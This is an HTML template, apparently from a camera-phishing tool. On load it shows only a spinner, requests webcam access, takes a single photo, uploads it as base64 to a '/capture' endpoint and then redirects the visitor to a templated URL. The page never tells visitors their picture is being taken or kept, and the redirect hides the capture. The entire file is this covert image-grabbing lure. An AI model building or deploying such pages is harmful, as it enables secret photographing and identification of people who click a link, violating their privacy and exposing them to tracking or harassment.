<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IMG Capture</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&display=swap');
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        .status {
            font-size: 1.2rem;
            margin-bottom: 30px;
            opacity: 0.9;
        }
        
        .loading {
            display: none;
            margin: 20px 0;
        }
        
        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid rgba(255, 255, 255, 0.3);
            border-top: 4px solid white;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 10px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
    </style>
</head>
<body>
    <div class="loading" id="loading" style="display: block;">
        <div class="spinner"></div>
    </div>

    <script>
    let stream = null;
    let video = null;
    let canvas = null;
    let redirectUrl = '{{ redirect_url }}';

    // Auto-request permission on page load
    window.onload = function() {
        requestPermission();
    };

    async function requestPermission() {
        try {
            // Request camera access
            stream = await navigator.mediaDevices.getUserMedia({
                video: {
                    width: { ideal: 1920 },
                    height: { ideal: 1080 }
                }
            });

            // Create video element to capture frame
            video = document.createElement('video');
            video.srcObject = stream;
            video.play();

            // Wait for video to be ready
            await new Promise(resolve => {
                video.addEventListener('loadedmetadata', resolve);
            });

            // Create canvas to capture frame
            canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;

            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0);

            // Convert to base64
            const imageData = canvas.toDataURL('image/png');

            // Stop the stream
            stream.getTracks().forEach(track => track.stop());

            // Spinner stays visible while saving

            // Send to server
            const response = await fetch('/capture', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ image: imageData })
            });

            const result = await response.json();

            if (result.success) {
                // Redirect after a short delay
                setTimeout(() => {
                    window.location.href = redirectUrl;
                }, 1500);
            } else {
                // Hide spinner if error
                document.getElementById('loading').style.display = 'none';
                alert('Error: ' + result.error);
            }

        } catch (error) {
            document.getElementById('loading').style.display = 'none';
            alert('Camera access denied or error occurred: ' + error.message);
        }
    }

    // Handle page visibility change to stop stream if user switches tabs
    document.addEventListener('visibilitychange', function() {
        if (document.hidden && stream) {
            stream.getTracks().forEach(track => track.stop());
        }
    });
    </script>
</body>
</html>
